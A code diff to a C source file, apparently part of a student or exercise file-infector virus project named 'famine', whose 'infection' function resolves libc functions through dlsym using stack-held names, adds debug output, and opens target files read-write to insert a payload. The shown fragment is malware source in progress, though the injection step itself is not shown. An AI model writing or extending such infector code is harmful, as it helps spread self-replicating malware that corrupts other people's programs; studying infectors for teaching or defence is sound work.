@@ -1,4 +1,5 @@
 #include "famine.h"
+#include <signal.h>
 
 int  infection(void *(*dlsym)(void *, const char *), void *handle, struct bfile *file,
 const char *dirname,  const char *filename, const char *payload) {
@@ -10,6 +11,8 @@ const char *dirname,  const char *filename, const char *payload) {
   int     (*close)(int);
   void    (*free)(void *);
   int     (*fstat)(int, struct stat *);
+  int     (*dprintf)(int, const char *, ...);
+  void    (*raise)(int);
   void    *(*mmap)(void *, size_t, int, int, int, off_t);
   char    mallocName[] = "malloc";
   char    strcpyName[] = "strcpy";
@@ -18,8 +21,11 @@ const char *dirname,  const char *filename, const char *payload) {
   char    openName[] = "open";
   char    closeName[] = "close";
   char    freeName[] = "free";
-  char    fstatName[] = "fstat";
+  char    fstatName[] = "__fxstat";
   char    mmapName[] = "mmap";
+  char    dprintfName[] = "dprintf";
+  char    raiseName[] = "raise";
+  char    slash[] = "/";
 
   malloc = dlsym(handle, mallocName);
   strcpy = dlsym(handle, strcpyName);
@@ -30,8 +36,11 @@ const char *dirname,  const char *filename, const char *payload) {
   fstat = dlsym(handle, fstatName);
   mmap = dlsym(handle, mmapName);
   strlen = dlsym(handle, strlenName);
+  dprintf = dlsym(handle, dprintfName);
+  raise = dlsym(handle, raiseName);
 
-  return (0);
+  char  yo[] = "Functions: %p\n";
+
   int         fd;
   char        *tmp;
   struct stat stats;
@@ -39,7 +48,7 @@ const char *dirname,  const char *filename, const char *payload) {
   if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
     return (-1);
   strcpy(tmp, dirname);
-  strcat(tmp, "/");
+  strcat(tmp, slash);
   strcat(tmp, filename);
   if ((fd = open(tmp, O_RDWR)) == -1) {
     free(tmp);
